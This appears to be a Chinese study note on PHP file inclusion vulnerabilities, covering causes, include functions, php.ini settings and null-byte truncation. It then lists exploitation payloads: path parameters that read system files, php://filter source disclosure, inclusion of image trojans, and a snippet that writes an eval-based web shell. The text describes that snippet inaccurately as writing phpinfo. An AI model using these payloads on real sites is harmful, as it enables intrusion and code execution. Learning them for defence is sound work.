# 文件包含

留言        连接数据库
查看留言    连接数据库
登录        连接数据库
注册        连接数据库

代码的重复
留言             连接数据库  单独的文件
查看留言
登录
注册

- 程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含

- 程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。

- 几乎所有的脚本语言都会提供文件包含功能。文件包含漏洞在PHP Web Application中居多，在JSP/ASP/ASP.net程序中比较少。

# 漏洞产生的原因

1. Web应用实现了动态包含
2. 动态包含的文件路径参数，客户端可控

# PHP中的文件包含

## 语句

PHP中提供了四个文件包含的函数

函数                          区别
include()                    文件包含失败时，会产生警告，脚本会继续执行
include_once()               与include()功能相同，文件只会被包含一次
require()                    文件包含失败时，会产生错误，直接结束脚本运行
require_once()               与require()功能相同，文件只会被包含一次

## 相关配置

文件包含是PHP的基本功能之一，有本地文件包含和远程文件包含之分（虽然php官网上不是这么解释的）。简单来说，本地文件包含就是可以读取和打开本地文件，远程文件包含（HTTP,FTP,PHP伪协议）就是可以远程加载文件。我们可以通过php.ini来进行配置。如下
allow_url_fopen=On/Off         本地文件包含（LFT）
allow_url_include=On/Off       远程包含漏洞（RFI）

### 本地文件包含

本地文件包含就是我们可以通过相对路径的方式找到文件，然后包含之

### 远程文件包含

远程文件包含就是我们可以通过http(s)或者ftp等方式，远程加载文件

# 漏洞原理及特点

- 漏洞原理

PHP文件包含是程序设计的基础功能之一，能够减少代码量，提高开发效率。但是使用文件包含功能时，有类似于测试代码的设计，实现了动态包含，就有产生文件包含漏洞的风险。如果实现动态包含的参数，Web应用没有进行严格净化，客户端用户可以影响或控制文件包含的路径，就会产生文件包含漏洞

- 特点

PHP提供的文件包含功能非常强大，有以下特点

@ 无视文件扩展名读取文件

@ 无条件解析PHP代码

## 空字符安全绕过

空字符安全限制绕过，是PHP小于5.3.4版本的一个漏洞，CVE编号是CVE-2006-7243。这个漏洞就是PHP接收来自于路径名中的空（Null）字符，这可能允许依赖于上下文的攻击者通过在此字符后放置安全文件扩展名来绕过预期的访问限制，也就是00截断。00截断攻击也会体现在文件包含中。

注意：需要关闭PHP的魔术引号

## 文件包含漏洞的利用

- 读取敏感文件

我们可以利用文件包含漏洞读取任意文件，读取文件的时候有利用条件
@ 目标主机文件存在（目标文件的路径，绝对路径，相对路径）
@ 具有文件可读权限
提交参数[?path=c:\windows\System32\drivers\etc\hosts],读取本地host的文件

- 直接包含图片木马

可以利用文件包含漏洞直接包含图片木马，直接包含图片木马
[?path=pngYjh.png]

使用菜刀连接

- 包含木马写Shell

我们也可以将如下代码写入到图片中
<?php fputs(fopne('shell.php','w'),"<?php @eval(\$_REQUEST['cmd'])?>");?>
该段代码的含义是，在当前目录下创建一个名为[shell.php]的文件，内容为[<?php phpinfo();?>],当我们直接包含图片的时候，这段代码就会被执行

- PHP封装协议--访问本地文件

我们可以使用php的file协议访问本地系统文件，提交参数
[?path=file://c:\windows\System32\drivers\etc\hosts]

- PHP封装协议--传输PHP文件

可以使用以下参数来传送任意PHP文件
[?path=php://filter/read=convert.base64-encode/resource=inc.php]
然后把得到的所有字符串base64解码即可

- PH封装协议--执行PHP命令

我们可以利用PHP的封装协议来执行PHP命令，如下

# 已知一个网站存在本地文件漏洞，没有文件上传API，如何利用？
1. 包含本地日志文件getShell
   日志文件的路径？
    1. 常识
    2. 爆破
2. 包含session文件，造成sessionId泄露

meyinfo5.0.4 文件包含漏洞代码审计